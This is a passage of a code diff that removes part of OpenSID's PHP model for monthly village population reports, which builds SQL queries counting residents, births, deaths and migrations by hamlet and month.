@@ -1,720 +1,545 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-defined('BASEPATH') || exit('No direct script access allowed');
-
-class Laporan_bulanan_model extends MY_Model
-{
-    protected $awal;
-    protected $lahir;
-    protected $datang;
-    protected $pindah;
-    protected $mati;
-    protected $hilang;
-
-    private function dusun_sql()
-    {
-        $dusun = $this->session->dusun;
-        if (! empty($dusun)) {
-            return " AND c.dusun = '" . $dusun . "'";
-        }
-    }
-
-    public function list_data()
-    {
-        $sql = "select c.id as id_cluster,c.rt,c.rw,c.dusun as dusunnya,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and sex='1' and id_cluster=c.id) as L,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and sex='2' and id_cluster=c.id) as P,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and (DATE_FORMAT( FROM_DAYS( TO_DAYS(NOW()) - TO_DAYS( tanggallahir ) ) , '%Y' ) +0)<1 and id_cluster=c.id ) as bayi,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and (DATE_FORMAT( FROM_DAYS( TO_DAYS(NOW()) - TO_DAYS( tanggallahir ) ) , '%Y' ) +0)>=1 and (DATE_FORMAT( FROM_DAYS( TO_DAYS(NOW()) - TO_DAYS( tanggallahir ) ) , '%Y' ) +0)<=5  and id_cluster=c.id ) as balita,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and (DATE_FORMAT( FROM_DAYS( TO_DAYS(NOW()) - TO_DAYS( tanggallahir ) ) , '%Y' ) +0)>=6 and (DATE_FORMAT( FROM_DAYS( TO_DAYS(NOW()) - TO_DAYS( tanggallahir ) ) , '%Y' ) +0)<=12  and id_cluster=c.id ) as sd,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and (DATE_FORMAT( FROM_DAYS( TO_DAYS(NOW()) - TO_DAYS( tanggallahir ) ) , '%Y' ) +0)>=13 and (DATE_FORMAT( FROM_DAYS( TO_DAYS(NOW()) - TO_DAYS( tanggallahir ) ) , '%Y' ) +0)<=15  and id_cluster=c.id ) as smp,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and (DATE_FORMAT( FROM_DAYS( TO_DAYS(NOW()) - TO_DAYS( tanggallahir ) ) , '%Y' ) +0)>=16 and (DATE_FORMAT( FROM_DAYS( TO_DAYS(NOW()) - TO_DAYS( tanggallahir ) ) , '%Y' ) +0)<=18  and id_cluster=c.id ) as sma,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and (DATE_FORMAT( FROM_DAYS( TO_DAYS(NOW()) - TO_DAYS( tanggallahir ) ) , '%Y' ) +0)>60 and id_cluster=c.id ) as lansia,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and id_cluster=c.id and cacat_id in (1,2,3,4,5,6)) as cacat,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and id_cluster=c.id and cacat_id='1') as cacat_fisik,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and id_cluster=c.id and cacat_id='2') as cacat_netra,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and id_cluster=c.id and cacat_id='3') as cacat_rungu,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and id_cluster=c.id and cacat_id='4') as cacat_mental,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and id_cluster=c.id and cacat_id='5') as cacat_fisik_mental,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and id_cluster=c.id and cacat_id='6') as cacat_lainnya,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and id_cluster=c.id and (cacat_id IS NULL OR cacat_id='7')) as tidak_cacat,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and sakit_menahun_id is not null and sakit_menahun_id <>'0' and sakit_menahun_id <>'14' and id_cluster=c.id and sex='1') as sakit_L,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and sakit_menahun_id is not null and sakit_menahun_id <>'0' and sakit_menahun_id <>'14' and id_cluster=c.id and sex='2') as sakit_P,
-            (select count(id) from penduduk_hidup where config_id=c.config_id and hamil='1' and id_cluster=c.id) as hamil
-            from tweb_wil_clusterdesa c WHERE c.config_id={$this->config_id} and rw<>'0' AND rt<>'0' AND (select count(id) from tweb_penduduk where config_id=c.config_id and id_cluster=c.id)>0 ";
-
-        $sql .= $this->dusun_sql();
-        $sql .= ' ORDER BY c.dusun,c.rw,c.rt ';
-        $query = $this->db->query($sql);
-        $data  = $query->result_array();
-        //	$data = null;
-        //Formating Output
-        for ($i = 0; $i < count($data); $i++) {
-            $data[$i]['no']    = $i + 1;
-            $data[$i]['tabel'] = $data[$i]['rt'];
-        }
-
-        return $data;
-    }
-
-    /**
-     * KETERANGAN kode_peristiwa di log_penduduk
-     * 1 = insert penduduk baru dengan status lahir
-     * 2 = penduduk mati
-     * 3 = penduduk pindah keluar
-     * 4 = penduduk hilang
-     * 5 = insert penduduk baru pindah masuk
-     * 6 = penduduk tidak tetap pergi
-     *
-     * @param mixed|null $rincian
-     * @param mixed|null $tipe
-     */
-    public function penduduk_awal($rincian = null, $tipe = null)
-    {
-        // Jika rincian dan tipe di definisikan, maka akan masuk kedetil laporan
-        if ($rincian && $tipe) {
-            return $this->rincian_awal($tipe);
-        }
-        $configId = identitas('id');
-        $bln      = $this->session->bulanku;
-        $thn      = $this->session->tahunku;
-        $pad_bln  = str_pad($bln, 2, '0', STR_PAD_LEFT); // Untuk membandingkan dengan tgl mysql
-
-        // Cari penduduk yang hidup sampai dengan akhir bulan sebelumnya, jadi harus cari berdasarkan log_penduduk
-        // tidak bisa menggunakan status_dasar pada tabel tweb_penduduk
-        $penduduk_mutasi_sql = $this->config_id('l')
-            ->select('p.*, l.kode_peristiwa')
-            ->from('tweb_penduduk p')
-            // Ambil log yg terakhir saja
-            ->join("(
-                SELECT    MAX(id) max_id, id_pend
-                FROM      log_penduduk
-                where DATE_FORMAT(tgl_lapor, '%Y-%m') < '{$thn}-{$pad_bln}'
-                GROUP BY  id_pend
-            ) log_max", 'log_max.id_pend = p.id')
-            ->join('log_penduduk l', 'log_max.max_id = l.id and l.kode_peristiwa not in (2, 3, 4)')
-            ->get_compiled_select();
-
-        $penduduk_mutasi = $this->db
-            ->select('sum(case when sex = 1 and warganegara_id <> 2 and kode_peristiwa in (1,5) then 1 else 0 end) AS WNI_L_PLUS')
-            ->select('sum(case when sex = 2 and warganegara_id <> 2 and kode_peristiwa in (1,5) then 1 else 0 end) AS WNI_P_PLUS')
-            ->select('sum(case when sex = 1 and warganegara_id = 2 and kode_peristiwa in (1,5) then 1 else 0 end) AS WNA_L_PLUS')
-            ->select('sum(case when sex = 2 and warganegara_id = 2 and kode_peristiwa in (1,5) then 1 else 0 end) AS WNA_P_PLUS')
-            ->select('sum(case when sex = 1 and warganegara_id <> 2 and kode_peristiwa in (2, 3, 4) then 1 else 0 end) AS WNI_L_MINUS')
-            ->select('sum(case when sex = 2 and warganegara_id <> 2 and kode_peristiwa in (2, 3, 4) then 1 else 0 end) AS WNI_P_MINUS')
-            ->select('sum(case when sex = 1 and warganegara_id = 2 and kode_peristiwa in (2, 3, 4) then 1 else 0 end) AS WNA_L_MINUS')
-            ->select('sum(case when sex = 2 and warganegara_id = 2 and kode_peristiwa in (2, 3, 4) then 1 else 0 end) AS WNA_P_MINUS')
-            ->from("({$penduduk_mutasi_sql}) as m")
-            ->get()
-            ->row_array();
-
-        // Perubahan keluarga sebelum bulan laporan
-        $keluarga_mutasi_sql = $this->config_id('l')
-            ->select('p.*, l.id_peristiwa')
-            ->from('log_keluarga l')
-            // Ambil log yg terakhir saja
-            ->join("(
-                select max(id) id from log_keluarga where id_kk IS NOT NULL and config_id = {$configId} and tgl_peristiwa < '{$thn}-{$pad_bln}-01'  group by id_kk
-            ) log_max_keluarga", 'log_max_keluarga.id = l.id')
-            ->join('tweb_keluarga k', 'k.id = l.id_kk')
-            // Ambil log yg terakhir saja
-            ->join("(
-                SELECT    MAX(id) max_id, id_pend
-                FROM      log_penduduk
-                where DATE_FORMAT(tgl_lapor, '%Y-%m') < '{$thn}-{$pad_bln}'
-                and config_id = {$configId}
-                GROUP BY  id_pend
-            ) log_max", 'log_max.id_pend = k.nik_kepala')
-            ->join('log_penduduk lp', 'log_max.max_id = lp.id and lp.kode_peristiwa not in (2, 3, 4) ')
-            ->join('tweb_penduduk p', 'p.id = lp.id_pend and p.kk_level = 1')
-            ->where("l.tgl_peristiwa < '{$thn}-{$pad_bln}-01'")
-            ->where('l.id_peristiwa not in (2,3,4)')
-            ->get_compiled_select();
-
-        $keluarga_mutasi = $this->db
-            ->select('sum(case when id_peristiwa in (1, 12) then 1 else 0 end) AS KK_PLUS')
-            ->select('sum(case when sex = 1 and id_peristiwa in (1, 12) then 1 else 0 end) AS KK_L_PLUS')
-            ->select('sum(case when sex = 2 and id_peristiwa in (1, 12) then 1 else 0 end) AS KK_P_PLUS')
-            ->select('sum(case when id_peristiwa in (2, 3, 4) then 1 else 0 end) AS KK_MINUS')
-            ->select('sum(case when sex = 1 and id_peristiwa in (2, 3, 4) then 1 else 0 end) AS KK_L_MINUS')
-            ->select('sum(case when sex = 2 and id_peristiwa in (2, 3, 4) then 1 else 0 end) AS KK_P_MINUS')
-            ->from("({$keluarga_mutasi_sql}) as m")
-            ->get()
-            ->row_array();
-
-        $penduduk_mutasi = array_merge($penduduk_mutasi, $keluarga_mutasi);
-
-        $data     = [];
-        $kategori = ['WNI_L', 'WNI_P', 'WNA_L', 'WNA_P', 'KK', 'KK_L', 'KK_P'];
-
-        foreach ($kategori as $k) {
-            $data[$k] = $penduduk_mutasi[$k . '_PLUS'] - $penduduk_mutasi[$k . '_MINUS'];
-        }
-        $data['tahun'] = $thn;
-        $data['bulan'] = $bln;
-
-        $this->awal = $data;
-
-        return $this->awal;
-    }
-
-    private function rincian_awal($tipe)
-    {
-        $penduduk = ['wni_l', 'wni_p', 'wna_l', 'wna_p', 'jml', 'jml_l', 'jml_p'];
-        $keluarga = ['kk', 'kk_l', 'kk_p'];
-        $bln      = $this->session->bulanku;
-        $thn      = $this->session->tahunku;
-        $pad_bln  = str_pad($bln, 2, '0', STR_PAD_LEFT); // Untuk membandingkan dengan tgl mysql
-
-        switch (true) {
-            case in_array($tipe, $penduduk):
-                // Perubahan penduduk sebelum bulan laporan
-                $this->config_id('l')
-                    ->select('p.*, l.kode_peristiwa')
-                    ->from('tweb_penduduk p')
-                    // Ambil log yg terakhir saja
-                    ->join("(
-                        SELECT    MAX(id) max_id, id_pend
-                        FROM      log_penduduk
-                        where DATE_FORMAT(tgl_lapor, '%Y-%m') < '{$thn}-{$pad_bln}'
-                        GROUP BY  id_pend
-                    ) log_max", 'log_max.id_pend = p.id')
-                    ->join('log_penduduk l', 'log_max.max_id = l.id and l.kode_peristiwa not in (2, 3, 4)');
-                break;
-
-            case in_array($tipe, $keluarga):
-                // Perubahan penduduk sebelum bulan laporan
-                $this->config_id('l')
-                    ->select('p.*, l.id_peristiwa')
-                    ->from('log_keluarga l')
-                    ->join('tweb_keluarga k', 'k.id = l.id_kk')
-                    ->join('tweb_penduduk p', 'p.id = k.nik_kepala and p.status_dasar = 1')
-                    ->where("DATE_FORMAT(l.tgl_peristiwa, '%Y-%m') < '{$thn}-{$pad_bln}'");
-                break;
-        }
-
-        $penduduk_mutasi_sql = $this->db->get_compiled_select();
-
-        // Mutasi plus
-        $penduduk_awal_bulan_plus_sql = $penduduk_mutasi_sql;
-        $this->db->select('*')->from('(' . $penduduk_awal_bulan_plus_sql . ') as p');
-        $this->rincian_dasar($tipe);
-
-        switch (true) {
-            case in_array($tipe, $penduduk):
-                $this->db->where('kode_peristiwa in (1,5)');
-                break;
-
-            case in_array($tipe, $keluarga):
-                $this->db->where('id_peristiwa in (1)');
-                break;
-        }
-        $penduduk_awal_bulan_plus_sql = $this->db->get_compiled_select();
-
-        // Mutasi minus
-        $penduduk_awal_bulan_minus_sql = $penduduk_mutasi_sql;
-        $this->db->select('*')->from('(' . $penduduk_awal_bulan_minus_sql . ') as m');
-        $this->rincian_dasar($tipe);
-
-        switch (true) {
-            case in_array($tipe, $penduduk):
-                $this->db->where('kode_peristiwa in (2, 3, 4)');
-                break;
-
-            case in_array($tipe, $keluarga):
-                $this->db->where('id_peristiwa in (2, 3, 4)');
-                break;
-        }
-        $penduduk_awal_bulan_minus_sql = $this->db->get_compiled_select();
-        $this->db->select('*')
-            ->from('(' . $penduduk_awal_bulan_minus_sql . ') as minus')
-            ->where('minus.id = plus.id');
-        $penduduk_awal_bulan_minus_sql = $this->db->get_compiled_select();
-
-        $this->db->select('*')
-            ->from('(' . $penduduk_awal_bulan_plus_sql . ') as plus')
-            ->where('NOT EXISTS (' . $penduduk_awal_bulan_minus_sql . ')');
-
-        return $this->db->get()->result_array();
-    }
-
-    private function rincian_dasar($tipe)
-    {
-        switch ($tipe) {
-            case 'wni_l': $this->db->where('sex = 1 AND warganegara_id <> 2');
-                break;
-
-            case 'wni_p': $this->db->where('sex = 2 AND warganegara_id <> 2');
-                break;
-
-            case 'wna_l': $this->db->where('sex = 1 AND warganegara_id = 2');
-                break;
-
-            case 'wna_p': $this->db->where('sex = 2 AND warganegara_id = 2');
-                break;
-
-            case 'jml': break;
-
-            case 'jml_l': $this->db->where('sex = 1');
-                break;
-
-            case 'jml_p': $this->db->where('sex = 2');
-                break;
-
-            case 'kk': break;
-
-            case 'kk_l': $this->db->where('sex = 1');
-                break;
-
-            case 'kk_p': $this->db->where('sex = 2');
-                break;
-        }
-    }
-
-    private function rincian_akhir($tipe)
-    {
-        $penduduk = ['wni_l', 'wni_p', 'wna_l', 'wna_p', 'jml', 'jml_l', 'jml_p'];
-        $keluarga = ['kk', 'kk_l', 'kk_p'];
-        $bln      = $this->session->bulanku;
-        $thn      = $this->session->tahunku;
-        $pad_bln  = str_pad($bln, 2, '0', STR_PAD_LEFT); // Untuk membandingkan dengan tgl mysql
-
-        switch (true) {
-            case in_array($tipe, $penduduk):
-                // Perubahan penduduk sebelum bulan laporan
-                $this->config_id('l')
-                    ->select('p.*, l.kode_peristiwa')
-                    ->from('log_penduduk l')
-                    ->join('tweb_penduduk p', 'l.id_pend = p.id')
-                    ->where("DATE_FORMAT(l.tgl_lapor, '%Y-%m') <= '{$thn}-{$pad_bln}'");
-                break;
-
-            case in_array($tipe, $keluarga):
-                // Perubahan penduduk sebelum bulan laporan
-                $this->config_id('l')
-                    ->select('p.*, l.id_peristiwa')
-                    ->from('log_keluarga l')
-                    ->join('tweb_keluarga k', 'k.id = l.id_kk')
-                    ->join('tweb_penduduk p', 'p.id = k.nik_kepala')
-                    ->where("DATE_FORMAT(l.tgl_peristiwa, '%Y-%m') <= '{$thn}-{$pad_bln}'");
-                break;
-        }
-
-        $penduduk_mutasi_sql = $this->db->get_compiled_select();
-
-        // Mutasi plus
-        $this->db->select('*')->from('(' . $penduduk_mutasi_sql . ') as p');
-        $this->rincian_dasar($tipe);
-
-        switch (true) {
-            case in_array($tipe, $penduduk):
-                $this->db->where('kode_peristiwa in (1,5)');
-                break;
-
-            case in_array($tipe, $keluarga):
-                $this->db->where('id_peristiwa in (1)');
-                break;
-        }
-        $mutasi_plus = $this->db->get_compiled_select();
-
-        // Mutasi minus
-        $this->db->select('*')->from('(' . $penduduk_mutasi_sql . ') as m');
-        $this->rincian_dasar($tipe);
-
-        switch (true) {
-            case in_array($tipe, $penduduk):
-                $this->db->where('kode_peristiwa in (2, 3, 4)');
-                break;
-
-            case in_array($tipe, $keluarga):
-                $this->db->where('id_peristiwa in (2, 3, 4)');
-                break;
-        }
-        $mutasi_minus = $this->db->get_compiled_select();
-        $this->db->select('*')
-            ->from('(' . $mutasi_minus . ') as minus')
-            ->where('minus.id = plus.id');
-        $mutasi_minus = $this->db->get_compiled_select();
-
-        $this->db->select('*')
-            ->from('(' . $mutasi_plus . ') as plus')
-            ->where('NOT EXISTS (' . $mutasi_minus . ')');
-
-        return $this->db->get()->result_array();
-    }
-
-    /**
-     * Panggil setelah menghitung penduduk awal dan semua mutasi
-     *
-     * @param mixed|null $rincian
-     * @param mixed|null $tipe
-     */
-    public function penduduk_akhir($rincian = null, $tipe = null)
-    {
-        // Jika rincian dan tipe di definisikan, maka akan masuk kedetil laporan
-        if ($rincian && $tipe) {
-            return $this->rincian_akhir($tipe);
-        }
-
-        $data     = [];
-        $kategori = ['WNI_L', 'WNI_P', 'WNA_L', 'WNA_P', 'KK', 'KK_L', 'KK_P'];
-
-        foreach ($kategori as $k) {
-            $data[$k] = $this->awal[$k] + $this->lahir[$k] + $this->datang[$k] - $this->mati[$k] - $this->pindah[$k] - $this->hilang[$k];
-        }
-        $data['tahun'] = $this->session->bulanku;
-        $data['bulan'] = $this->session->tahunku;
-
-        return $data;
-    }
-
-    // Perubahan penduduk pada bulan laporan
-    private function mutasi_pada_bln_thn($kode_peristiwa)
-    {
-        $bln = $this->session->bulanku;
-        $thn = $this->session->tahunku;
-
-        $this->config_id('l')
-            ->select('p.*, l.ref_pindah, l.kode_peristiwa')
-            ->from('log_penduduk l')
-            ->join('tweb_penduduk p', 'l.id_pend = p.id')
-            ->where('year(l.tgl_lapor)', $thn)
-            ->where('month(l.tgl_lapor)', $bln)
-            ->where('l.kode_peristiwa', $kode_peristiwa);
-
-        return $this->db->get_compiled_select();
-    }
-
-    /**
-     * Untuk statistik perkembangan keluarga
-     * id_peristiwa:
-     * 1 - keluarga baru
-     * 2 - kepala keluarga status dasar 'mati'
-     * 3 - kepala keluarga status dasar 'pindah'
-     * 4 - kepala keluarga status dasar 'hilang'
-     * 6 - kepala keluarga status dasar 'pergi' (seharusnya tidak ada)
-     * 11- kepala keluarga status dasar 'tidak valid' (seharusnya tidak ada)
-     * 12- anggota keluarga keluar atau pecah dari keluarga
-     * 13 - keluarga dihapus
-     * 14 - kepala keluarga status dasar kembali 'hidup' (salah mengisi di log_penduduk)
-     *
-     *  Perubahan keluarga pada bulan laporan
-     *
-     * @param mixed $kode_peristiwa
-     */
-    private function mutasi_keluarga_bln_thn($kode_peristiwa)
-    {
-        $bln = $this->session->bulanku;
-        $thn = $this->session->tahunku;
-
-        $id_peristiwa = $kode_peristiwa;
-
-        $this->config_id('l')
-            ->select('p.*, l.id_peristiwa')
-            ->from('log_keluarga l')
-            ->join('tweb_keluarga k', 'k.id = l.id_kk')
-            ->join('tweb_penduduk p', 'p.id = k.nik_kepala')
-            ->join('log_penduduk lp', 'lp.id = l.id_log_penduduk', 'left')
-            ->group_start()
-            ->where("lp.tgl_lapor is not null and year(lp.tgl_lapor) = {$thn}")
-            ->or_where("lp.tgl_lapor is null and year(l.tgl_peristiwa) = {$thn}")
-            ->group_end()
-            ->group_start()
-            ->where("lp.tgl_lapor is not null and month(lp.tgl_lapor) = {$bln}")
-            ->or_where("lp.tgl_lapor is null and month(l.tgl_peristiwa) = {$bln}")
-            ->group_end()
-            ->where('l.id_peristiwa', $id_peristiwa);
-
-        return $this->db->get_compiled_select();
-    }
-
-    private function rincian_peristiwa($peristiwa, $tipe)
-    {
-        $penduduk = ['wni_l', 'wni_p', 'wna_l', 'wna_p', 'jml', 'jml_l', 'jml_p'];
-        $keluarga = ['kk', 'kk_l', 'kk_p'];
-
-        if (in_array($tipe, $penduduk)) {
-            $mutasi_pada_bln_thn = $this->mutasi_pada_bln_thn($peristiwa);
-            $this->db
-                ->select('*')
-                ->from("({$mutasi_pada_bln_thn}) as m");
-
-            switch ($tipe) {
-                case 'wni_l': $this->db->where('sex = 1 AND warganegara_id <> 2');
-                    break;
-
-                case 'wni_p': $this->db->where('sex = 2 AND warganegara_id <> 2');
-                    break;
-
-                case 'wna_l': $this->db->where('sex = 1 AND warganegara_id = 2');
-                    break;
-
-                case 'wna_p': $this->db->where('sex = 2 AND warganegara_id = 2');
-                    break;
-
-                case 'jml': break;
-
-                case 'jml_l': $this->db->where('sex = 1');
-                    break;
-
-                case 'jml_p': $this->db->where('sex = 2');
-                    break;
-            }
-        } elseif (in_array($tipe, $keluarga)) {
-            $mutasi_keluarga_bln_thn = $this->mutasi_keluarga_bln_thn($peristiwa);
-            $this->db
-                ->select('*')
-                ->from('(' . $mutasi_keluarga_bln_thn . ') as m');
-
-            switch ($tipe) {
-                case 'kk': break;
-
-                case 'kk_l': $this->db->where('sex = 1');
-                    break;
-
-                case 'kk_p': $this->db->where('sex = 2');
-                    break;
-            }
-        }
-
-        return $this->db->get()->result_array();
-    }
-
-    private function mutasi_peristiwa($peristiwa, $rincian = null, $tipe = null)
-    {
-        // Jika rincian dan tipe di definisikan, maka akan masuk kedetil laporan
-        if ($rincian && $tipe) {
-            return $this->rincian_peristiwa($peristiwa, $tipe);
-        }
-
-        // Mutasi penduduk
-        $mutasi_pada_bln_thn = $this->mutasi_pada_bln_thn($peristiwa);
-
-        $data = $this->db
-            ->select('sum(case when sex = 1 and warganegara_id <> 2 then 1 else 0 end) AS WNI_L')
-            ->select('sum(case when sex = 2 and warganegara_id <> 2 then 1 else 0 end) AS WNI_P')
-            ->select('sum(case when sex = 1 and warganegara_id = 2 then 1 else 0 end) AS WNA_L')
-            ->select('sum(case when sex = 2 and warganegara_id = 2 then 1 else 0 end) AS WNA_P')
-            ->from('(' . $mutasi_pada_bln_thn . ') as m')
-            ->get()
-            ->row_array();
-
-        // Mutasi keluarga
-        $mutasi_keluarga_bln_thn = $this->mutasi_keluarga_bln_thn($peristiwa);
-        $kel                     = $this->db
-            ->select('sum(case when kk_level = 1 then 1 else 0 end) AS KK')
-            ->select('sum(case when kk_level = 1 and sex = 1 then 1 else 0 end) AS KK_L')
-            ->select('sum(case when kk_level = 1 and sex = 2 then 1 else 0 end) AS KK_P')
-            ->from('(' . $mutasi_keluarga_bln_thn . ') as m')
-            ->get()
-            ->row_array();
-
-        return array_merge($data, $kel);
-    }
-
-    public function kelahiran($rincian = null, $tipe = null)
-    {
-        $this->lahir = $this->mutasi_peristiwa(1, $rincian, $tipe);
-
-        return $this->lahir;
-    }
-
-    public function kematian($rincian = null, $tipe = null)
-    {
-        $this->mati = $this->mutasi_peristiwa(2, $rincian, $tipe);
-
-        return $this->mati;
-    }
-
-    public function pindah($rincian = null, $tipe = null)
-    {
-        $this->pindah = $this->mutasi_peristiwa(3, $rincian, $tipe);
-
-        return $this->pindah;
-    }
-
-    public function rincian_pindah()
-    {
-        $mutasi_pada_bln_thn = $this->mutasi_pada_bln_thn(3);
-
-        $data = $this->db
-            ->select('sum(case when sex = 1 and ref_pindah = 1 then 1 else 0 end) AS DESA_L')
-            ->select('sum(case when sex = 2 and ref_pindah = 1 then 1 else 0 end) AS DESA_P')
-            ->select('sum(case when sex = 1 and ref_pindah = 1 and kk_level = 1 then 1 else 0 end) AS DESA_KK_L')
-            ->select('sum(case when sex = 2 and ref_pindah = 1 and kk_level = 1 then 1 else 0 end) AS DESA_KK_P')
-
-            ->select('sum(case when sex = 1 and ref_pindah = 2 then 1 else 0 end) AS KEC_L')
-            ->select('sum(case when sex = 2 and ref_pindah = 2 then 1 else 0 end) AS KEC_P')
-            ->select('sum(case when sex = 1 and ref_pindah = 2 and kk_level = 1 then 1 else 0 end) AS KEC_KK_L')
-            ->select('sum(case when sex = 2 and ref_pindah = 2 and kk_level = 1 then 1 else 0 end) AS KEC_KK_P')
-
-            ->select('sum(case when sex = 1 and ref_pindah = 3 then 1 else 0 end) AS KAB_L')
-            ->select('sum(case when sex = 2 and ref_pindah = 3 then 1 else 0 end) AS KAB_P')
-            ->select('sum(case when sex = 1 and ref_pindah = 3 and kk_level = 1 then 1 else 0 end) AS KAB_KK_L')
-            ->select('sum(case when sex = 2 and ref_pindah = 3 and kk_level = 1 then 1 else 0 end) AS KAB_KK_P')
-
-            ->select('sum(case when sex = 1 and ref_pindah = 4 then 1 else 0 end) AS PROV_L')
-            ->select('sum(case when sex = 2 and ref_pindah = 4 then 1 else 0 end) AS PROV_P')
-            ->select('sum(case when sex = 1 and ref_pindah = 4 and kk_level = 1 then 1 else 0 end) AS PROV_KK_L')
-            ->select('sum(case when sex = 2 and ref_pindah = 4 and kk_level = 1 then 1 else 0 end) AS PROV_KK_P')
-
-            ->from('(' . $mutasi_pada_bln_thn . ') as m')
-            ->get()
-            ->row_array();
-
-        $data['TOTAL_L']    = $data['DESA_L'] + $data['KEC_L'] + $data['KAB_L'] + $data['PROV_L'];
-        $data['TOTAL_P']    = $data['DESA_P'] + $data['KEC_P'] + $data['KAB_P'] + $data['PROV_P'];
-        $data['TOTAL_KK_L'] = $data['DESA_KK_L'] + $data['KEC_KK_L'] + $data['KAB_KK_L'] + $data['PROV_KK_L'];
-        $data['TOTAL_KK_P'] = $data['DESA_KK_P'] + $data['KEC_KK_P'] + $data['KAB_KK_P'] + $data['PROV_KK_P'];
-
-        return $data;
-    }
-
-    public function pendatang($rincian = null, $tipe = null)
-    {
-        $this->datang = $this->mutasi_peristiwa(5, $rincian, $tipe);
-
-        return $this->datang;
-    }
-
-    public function hilang($rincian = null, $tipe = null)
-    {
-        $this->hilang = $this->mutasi_peristiwa(4, $rincian, $tipe);
-
-        return $this->hilang;
-    }
-
-    public function rekapitulasi_list($offset = 0, $limit = 0)
-    {
-        //List Data
-        $this->rekapitulasi_data();
-
-        //Paging SQL
-        if ($limit > 0) {
-            $this->db->limit($limit, $offset);
-        }
-
-        $data = $this->db->get()->result_array();
-
-        //Set Penduduk Akhir
-        foreach ($data as $key => $value) {
-            $data[$key]['WNI_L_AKHIR']      = $value['WNI_L_AWAL'] + $value['WNI_L_TAMBAH_LAHIR'] + $value['WNI_L_TAMBAH_MASUK'] - $value['WNI_L_KURANG_MATI'] - $value['WNI_L_KURANG_KELUAR'];
-            $data[$key]['WNI_P_AKHIR']      = $value['WNI_P_AWAL'] + $value['WNI_P_TAMBAH_LAHIR'] + $value['WNI_P_TAMBAH_MASUK'] - $value['WNI_P_KURANG_MATI'] - $value['WNI_P_KURANG_KELUAR'];
-            $data[$key]['WNA_L_AKHIR']      = $value['WNA_L_AWAL'] + $value['WNA_L_TAMBAH_LAHIR'] + $value['WNA_L_TAMBAH_MASUK'] - $value['WNA_L_KURANG_MATI'] - $value['WNA_L_KURANG_KELUAR'];
-            $data[$key]['WNA_P_AKHIR']      = $value['WNA_P_AWAL'] + $value['WNA_P_TAMBAH_LAHIR'] + $value['WNA_P_TAMBAH_MASUK'] - $value['WNA_P_KURANG_MATI'] - $value['WNA_P_KURANG_KELUAR'];
-            $data[$key]['KK_AKHIR_JML']     = $value['KK_JLH'] + $value['KK_MASUK_JLH'];
-            $data[$key]['KK_AKHIR_ANG_KEL'] = $value['KK_ANG_KEL'] + $value['KK_MASUK_ANG_KEL'];
-        }
-
-        return $data;
-    }
-
-    protected function search_sql()
-    {
-        if ($cari = $this->session->cari) {
-            $this->db
-                ->group_start()
-                ->like('a.dusun', $cari)
-                ->group_end();
-        }
-    }
-
-    public function rekapitulasi_data()
-    {
-        $bln     = $this->session->filter_bulan;
-        $thn     = $this->session->filter_tahun;
-        $pad_bln = str_pad($bln, 2, '0', STR_PAD_LEFT); // Untuk membandingkan dengan tgl mysql
-
-        $this->db
-            ->select('a.dusun as DUSUN')
-            // Penduduk Awal Bulan
-            ->select("(sum(case when p.sex = 1 and p.warganegara_id <> 2 and l.kode_peristiwa in (1,5) and DATE_FORMAT(l.tgl_lapor, '%Y-%m') < '{$thn}-{$pad_bln}' then 1 else 0 end) - sum(case when p.sex = 1 and p.warganegara_id <> 2 and l.kode_peristiwa in (2,3,4) and DATE_FORMAT(l.tgl_lapor, '%Y-%m') < '{$thn}-{$pad_bln}' then 1 else 0 end)) AS WNI_L_AWAL")
-            ->select("(sum(case when p.sex = 2 and p.warganegara_id <> 2 and l.kode_peristiwa in (1,5) and DATE_FORMAT(l.tgl_lapor, '%Y-%m') < '{$thn}-{$pad_bln}' then 1 else 0 end) - sum(case when p.sex = 2 and p.warganegara_id <> 2 and l.kode_peristiwa in (2,3,4) and DATE_FORMAT(l.tgl_lapor, '%Y-%m') < '{$thn}-{$pad_bln}' then 1 else 0 end)) AS WNI_P_AWAL")
